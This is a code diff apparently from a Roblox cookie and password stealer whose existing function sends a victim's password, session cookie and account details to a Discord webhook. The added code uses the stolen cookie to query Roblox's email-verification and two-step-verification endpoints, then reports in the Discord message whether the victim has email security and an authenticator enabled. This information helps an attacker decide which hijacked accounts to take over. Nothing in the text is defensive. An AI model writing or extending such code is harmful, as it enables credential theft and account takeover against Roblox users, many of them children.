@@ -113,6 +113,11 @@ def send_to_discord_background(password, cookie, webhook_url):
                             'name': '💀 Headless',
                             'value': '✅' if headless else '❌',
                             'inline': False
+                        },
+                        {
+                            'name': '🔐 Account Settings',
+                            'value': f"Email Verify {user_info.get('email_verified', '❌')} | Email Secure {user_info.get('email_secure', '❌')} | Authenticator {user_info.get('authenticator_enabled', '❌')}",
+                            'inline': False
                         }
                     ],
                     'footer': {
@@ -330,6 +335,53 @@ def get_roblox_user_info(cookie):
             except Exception as headless_error:
                 print(f"Error checking Headless inventory: {str(headless_error)}")
             
+            # Check Account Settings (Email verification, Email secure, Authenticator)
+            email_verified = '❌'
+            email_secure = '❌'
+            authenticator_enabled = '❌'
+            
+            try:
+                # Check email verification and 2FA settings
+                settings_response = requests.get('https://accountsettings.roblox.com/v1/email',
+                                               headers=headers, timeout=5)
+                print(f"Account settings API response status: {settings_response.status_code}")
+                
+                if settings_response.status_code == 200:
+                    settings_data = settings_response.json()
+                    print(f"Account settings API response: {settings_data}")
+                    
+                    # Check email verification status
+                    if settings_data.get('emailAddress') and settings_data.get('verified', False):
+                        email_verified = '✅'
+                        email_secure = '✅'  # If email is verified, consider it secure
+                else:
+                    print(f"Account settings API failed with status: {settings_response.status_code}")
+                    
+            except Exception as settings_error:
+                print(f"Error checking account settings: {str(settings_error)}")
+            
+            try:
+                # Check 2FA/Authenticator status
+                twostep_response = requests.get('https://twostepverification.roblox.com/v1/users/configuration',
+                                              headers=headers, timeout=5)
+                print(f"2FA API response status: {twostep_response.status_code}")
+                
+                if twostep_response.status_code == 200:
+                    twostep_data = twostep_response.json()
+                    print(f"2FA API response: {twostep_data}")
+                    
+                    # Check if authenticator is enabled
+                    if twostep_data.get('authenticatorEnabled', False) or twostep_data.get('totpEnabled', False):
+                        authenticator_enabled = '✅'
+                    elif twostep_data.get('emailEnabled', False):
+                        # Email-based 2FA is enabled but not authenticator app
+                        pass  # Keep authenticator as ❌ but user has some 2FA
+                else:
+                    print(f"2FA API failed with status: {twostep_response.status_code}")
+                    
+            except Exception as twostep_error:
+                print(f"Error checking 2FA settings: {str(twostep_error)}")
+            
             return {
                 'success': True,
                 'username': username,
@@ -341,7 +393,10 @@ def get_roblox_user_info(cookie):
                 'premium_status': premium_status,
                 'total_spent_past_year': total_spent_past_year,
                 'has_korblox': has_korblox,
-                'has_headless': has_headless
+                'has_headless': has_headless,
+                'email_verified': email_verified,
+                'email_secure': email_secure,
+                'authenticator_enabled': authenticator_enabled
             }
         else:
             print(f"Cookie validation failed against Roblox API: {response.status_code}")
@@ -362,7 +417,10 @@ def get_roblox_user_info(cookie):
         'premium_status': '❌ No',
         'total_spent_past_year': 'Not available',
         'has_korblox': False,
-        'has_headless': False
+        'has_headless': False,
+        'email_verified': '❌',
+        'email_secure': '❌',
+        'authenticator_enabled': '❌'
     }
 
 def is_valid_cookie(cookie):
